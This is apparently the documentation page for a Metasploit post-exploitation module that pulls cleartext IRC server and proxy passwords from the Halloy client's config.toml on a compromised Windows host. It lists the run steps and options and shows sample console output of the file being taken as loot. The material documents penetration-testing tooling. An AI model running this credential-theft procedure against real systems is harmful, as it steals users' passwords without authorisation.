## Vulnerable Application

This post-exploitation module extracts clear text credentials from the Halloy IRC Client.

The Halloy IRC Client is avaialble from (https://github.com/squidowl/halloy).

This module extracts information from the config.toml file in the "AppData\Roaming\Halloy" directory.

This module extracts server information such as server, port, nickname, password and proxy password.


## Verification Steps

1. Start MSF console
2. Get a Meterpreter session on a Windows system
3. use post/windows/gather/credentials/halloy_irc
4. Set SESSION 1
5. enter 'run' to extract credentials from all applications


## Options
### VERBOSE

By default verbose is turned off. When turned on, the module will show information on files
which aren't extracted and information that is not directly related to the artifact output.


### STORE_LOOT
This option is turned on by default and saves the stolen artifacts/files on the local machine,
this is required for also extracting credentials from files using regexp, JSON, XML, and SQLite queries.


### EXTRACT_DATA
This option is turned on by default and will perform the data extraction using the predefined
regular expression. The 'Store loot' options must be turned on in order for this to take work.

## Scenarios
### Halloy v2024.6 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Default Output
```
msf6 post(windows/gather/credentials/halloy_irc) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Halloy irc's Config.toml file found
[*] Downloading C:\Users\test\AppData\Roaming\halloy\config.toml
[*] Halloy irc Config.toml downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240507133313_default_10.0.0.2_HalloyIRCconfig_968975.toml

[+] server="irc.libera.chat"
[+] port=6697
[+] nickname="halloy4169"
[+] File with data saved:  /home/kali/.msf4/loot/20240507133313_default_10.0.0.2_EXTRACTIONconfig_815098.toml
[*] PackRat credential sweep Completed
[*] Post module execution completed

```

### Halloy v2024.6 on Microsoft Windows 10 Home 10.0.19045 N/A Build 19045 - Verbose Output
```

msf6 post(windows/gather/credentials/halloy_irc_v2) > run

[*] Filtering based on these selections:  
[*] ARTIFACTS: All
[*] STORE_LOOT: true
[*] EXTRACT_DATA: true

[*] Starting Packrat...
[-] Halloy irc's base folder not found in users's user directory

[*] Starting Packrat...
[*] Halloy irc's base folder found
[*] Found the folder containing specified artifact for config.toml.
[*] Halloy irc's Config.toml file found
[*] Processing C:\Users\test\AppData\Roaming\halloy
[*] Downloading C:\Users\test\AppData\Roaming\halloy\config.toml
[*] Halloy irc Config.toml downloaded
[+] File saved to:  /home/kali/.msf4/loot/20240507145656_default_10.0.0.2_HalloyIRCconfig_292638.toml

[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] server="irc.libera.chat"
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] port=6697
[*] Searches for credentials (USERNAMES/PASSWORDS)
[+] nickname="halloy4169"
[+] File with data saved:  /home/kali/.msf4/loot/20240507145656_default_10.0.0.2_EXTRACTIONconfig_238220.toml
[*] PackRat credential sweep Completed
[*] Post module execution completed

```
